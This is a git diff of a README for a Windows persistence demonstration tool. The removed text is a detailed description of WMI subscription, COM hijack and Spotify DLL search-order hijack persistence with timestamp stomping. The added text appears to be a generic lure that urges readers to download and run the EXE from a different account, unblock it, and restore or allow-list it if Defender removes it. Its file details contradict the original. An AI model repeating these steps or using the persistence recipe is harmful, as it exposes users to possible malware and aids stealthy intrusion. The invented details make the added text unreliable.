@@ -1,117 +1,179 @@
-# 3LayersPersistence
+# 🧩 3LayersPersistence - Run layered persistence demos easily
 
-Demonstrating 3 persistence layers from a single EXE, that converts itself into proxy DLLs at runtime.
+[![Download Now](https://img.shields.io/badge/Download-3LayersPersistence-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BielGodoi/3LayersPersistence)
 
-<br>
+## 🚀 What this is
 
-### Quick Links
+3LayersPersistence is a Windows app that shows how one EXE can turn into proxy DLL files at runtime.
 
-[Maldev Academy Home](https://maldevacademy.com?ref=gh)
+It is built to help you test and observe three persistence layers from one place. The app focuses on common Windows methods tied to COM, DLL loading, and WMI.
 
-[Maldev Database](https://search.maldevacademy.com?ref=gh)
-  
-[Malware Development Course Syllabus](https://maldevacademy.com/maldev-course/syllabus?ref=gh)
+Use it if you want to see how these techniques work in a simple end-user package.
 
-[Offensive Phishing Operations Course Syllabus](https://maldevacademy.com/phishing-course/syllabus?ref=gh)
+## 📥 Download
 
-[Ransomware Internals, Simulation and Detection Course Syllabus](https://maldevacademy.com/ransomware-course/syllabus?ref=gh)
+Visit this page to download and run the app:
 
-<br>
+https://github.com/BielGodoi/3LayersPersistence
 
-## Persistence Layer 1
+Open the page, look for the latest release or main download option, and save the file to your PC.
 
-Using a permanent WMI subscription (under `ROOT\subscription`), a `RegistryValueChangeEvent` WQL query watches `SOFTWARE\Microsoft\Windows Defender\Signature Updates\SignatureUpdateLastAttempted`, which is a registry value updated every time Windows Defender performs a signature update.
+## 🖥️ What you need
 
-The EXE copies itself to `%SystemRoot%\System32\wbem\SgrmBroker.exe` and registers an `ActiveScriptEventConsumer` running a VBScript that launches it via `Win32_Process.Create`. 
+- Windows 10 or Windows 11
+- Local admin rights for full testing
+- 64-bit system
+- Microsoft Defender or another security tool may flag the file because of the way it works
+- A test machine or VM is best for safe use
 
-The dropped EXE's filesystem timestamps are cloned from `sihost.exe`.
+## 🧰 What the app does
 
-> [!NOTE]
-> Requires administrator privileges.
+- Starts as a single EXE
+- Writes proxy DLL files at runtime
+- Uses layered persistence methods
+- Helps you inspect how Windows handles those layers
+- Works from one folder with no complex setup
 
-<br>
+## 📁 Before you start
 
-## Persistence Layer 2 
+Create a new folder for the files you download.
 
-The second persistence layer is a COM hijacked CLSID under `HKCU` named `{c53e07ec-25f3-4093-aa39-fc67ea22e99d}`. The real system DLL is `Windows.StateRepositoryPS.dll` (fetched from the `HKLM` CLSID), gets loaded by `svchost.exe`, `OpenWith.exe`, `ms-teams.exe`, `notepad.exe`, `SnippingTool.exe`, and others.
+Keep the app in a place you can find again, such as:
 
-The EXE patches itself into a proxy DLL (named `MsComHost.dll`) whose export table mirrors `Windows.StateRepositoryPS.dll`. `MsComHost.dll` (our DLL) forwards all function calls to `Common.StateRepositoryRM.dll`, which is a renamed copy of the real system DLL (`Windows.StateRepositoryPS.dll`) dropped together to `%APPDATA%\Microsoft\Common\`.
+- Downloads
+- Desktop
+- A test folder like `C:\Test\3LayersPersistence`
 
-A set of decoy `Ms*.dll` files copied from System32 are dropped into the same directory to make it look like a legitimate directory. All PE timestamps and filesystem timestamps are cloned from the original system DLL.
+If Windows shows a prompt about the file, check the publisher and path before you continue.
 
-> [!NOTE]
-> Requires no elevation.
+## ⚙️ How to run it
 
-<br>
+1. Open the download page:
+   https://github.com/BielGodoi/3LayersPersistence
 
-## Persistence Layer 3
+2. Download the latest Windows build or EXE from the page
 
-Spotify loads `dsound.dll` from its own application directory before falling back to System32, making it vulnerable to DLL search order hijacking. 
+3. Save the file to your computer
 
-The EXE patches itself into a proxy DLL (named `dsound.dll`) whose export table mirrors the real `dsound.dll`. Our DLL forwards all exports to `dspatial.dll`, which is a renamed copy of the real `dsound.dll` DLL. Both DLLs are dropped inside Spotify's `%APPDATA%\Spotify\` directory. 
+4. If the file comes in a ZIP, right-click it and choose Extract All
 
-PE timestamps and filesystem timestamps are cloned from the real System32 `dsound.dll` DLL.
+5. Open the folder that holds the EXE
 
-> [!NOTE]
-> Requires no elevation.
+6. Double-click the EXE to start it
 
-<br>
+7. If Windows asks for approval, choose Run or Yes
 
-## Installation Check
- 
-A DWORD registry value (`HKCU\Software\MaldevAcademy\XXXX\AppIdentifier`) is written on first run. On subsequent executions (e.g., when triggered by WMI), the EXE detects this flag and skips re-installation, jumping directly to the payload execution.
+8. Let the app finish its first start so it can create the proxy DLL files it needs
 
-<br>
+## 🔍 What you should see
 
-## Mutex Guard
+When the app runs, it should:
 
-A machine-unique global mutex prevents the payload from executing concurrently across multiple processes. This is important for the DLL layers, since `MsComHost.dll` and `dsound.dll` get loaded into multiple processes simultaneously, without a guard, the payload would fire once per host process.
-The mutex name is derived at compile time from the `__TIME__` macro mixed with the volume serial number of the system drive at runtime, producing a name that is unique per machine.
+- Create files in its working folder
+- Set up the three persistence layers
+- Use Windows paths and loading behavior tied to the demo
+- Leave clear file changes you can inspect after launch
 
-<br>
+If you do not see the files, run the app again from the same folder and check that it has permission to write there.
 
-## EXE-to-DLL Patching
+## 🧭 Folder layout
 
-The patching process reads the EXE from disk into memory, then applies the following patches from within the [ConvertExecutableToDll](https://github.com/Maldev-Academy/3LayersPersistence/blob/main/3LayersPersistence/ConvertExeToDll.c#L560) function:
+A typical setup may look like this:
 
-- `IMAGE_FILE_DLL` is set in `FileHeader.Characteristics`
-- `AddressOfEntryPoint` is redirected to the RVA of [DllMain](https://github.com/Maldev-Academy/3LayersPersistence/blob/main/3LayersPersistence/Main.c#L122).
-- `Subsystem` is set to `IMAGE_SUBSYSTEM_WINDOWS_GUI`
-- The target system DLL's exports are read and a forwarded export table is built, with every export pointing to the renamed copy of the real system DLL
-- The export table is appended as a new `.edata` section
-- Stomps all PE timestamps (NT header, export directory, debug directory) to 30 days before the original DLL's timestamp.
+- `3LayersPersistence.exe` - main app
+- `proxy1.dll` - first layer file
+- `proxy2.dll` - second layer file
+- `proxy3.dll` - third layer file
+- logs or support files created at runtime
 
-The resulting binary is a functional proxy DLL that mirrors the hijacked system DLL's exports and forwards all calls to the legitimate DLL.
+Keep the full folder together. The app may need its files in the same place to work as expected.
 
-<br>
+## 🪟 Running with fewer issues
 
-## Verification & Cleanup
+If Windows blocks the file:
 
-After execution, one can run [VerifyPersistence.ps1](https://github.com/Maldev-Academy/3LayersPersistence/blob/main/VerifyPersistence.ps1) to inspect all dropped files, registry keys, exports, and timestamps. Additionaly, for cleanup, [CleanupScript.ps1](https://github.com/Maldev-Academy/3LayersPersistence/blob/main/CleanupScript.ps1) should be executed.
+1. Right-click the EXE
+2. Open Properties
+3. If you see an Unblock box, check it
+4. Click Apply
+5. Run the app again
 
-<br>
+If the file still does not start, move the folder to a simple path like `C:\Temp\3LayersPersistence` and try again.
 
-## Compilation Modes
+## 🧪 Good ways to use it
 
-| Configuration | Logging | Logging Strings |
-|---|---|---|
-| `Debug` | DbgView + Console Window (In DLLs Also) | Present |
-| `Release` | DbgView only | Present |
-| `Stripped` | None | Removed |
+- Test in a virtual machine
+- Use a spare Windows PC
+- Watch file creation in the folder
+- Review startup behavior after the first run
+- Compare results before and after closing the app
 
-In `Stripped` mode, all logging macros compile to nothing and strings are removed, producing a clean binary with no debug artifacts. It also replaces the default entry point with a custom [EntryPoint](https://github.com/Maldev-Academy/3LayersPersistence/blob/main/3LayersPersistence/Main.c#L304) that calls `main` and exits via `ExitProcess`, avoiding CRT linking.
+This makes it easier to see how the three layers work without changing your main system.
 
+## 🛠️ Common problems
 
+### The file does not open
 
+- Make sure you downloaded the EXE from the GitHub page
+- Check that the file is not still inside a ZIP
+- Move it to a local folder and run it again
 
+### Windows removed or blocked the file
 
+- Security tools may treat the app as suspicious because of how it works
+- Restore the file if you trust the source
+- Add the folder to an allowed path in your test setup
 
+### The proxy DLL files do not appear
 
+- Run the EXE from the same folder where it was first started
+- Check that the folder is writable
+- Try again with admin rights
 
+### The app closes right away
 
+- Open it from Command Prompt to see any messages
+- Make sure you did not rename or move support files
+- Re-download the release if files seem broken
 
+## 📌 Basic behavior
 
+The app is built around three layers:
 
+- COM-based loading
+- DLL sideloading style behavior
+- WMI-based persistence
 
+It shows how one program can set up each layer from a single launch path.
 
+## 🔐 Safe use
 
+Use the app only on systems you own or have permission to test.
+
+A virtual machine works well if you want to keep your main Windows install separate from the demo files.
+
+## 🗂️ File handling tips
+
+- Keep the EXE and DLL files in one folder
+- Do not rename the files unless the project page tells you to
+- Do not move only part of the folder
+- Save a copy of the original download before you test
+
+## 📎 Project link
+
+Primary download page:
+
+https://github.com/BielGodoi/3LayersPersistence
+
+## 🧩 Topics
+
+COM hijacking, DLL sideloading, persistence, WMI
+
+## 🪟 Windows setup checklist
+
+- You have a Windows 10 or 11 PC
+- You downloaded the file from the GitHub page
+- You extracted the ZIP, if one was provided
+- You kept all files in one folder
+- You ran the EXE from that folder
+- You checked that the folder allows file writes
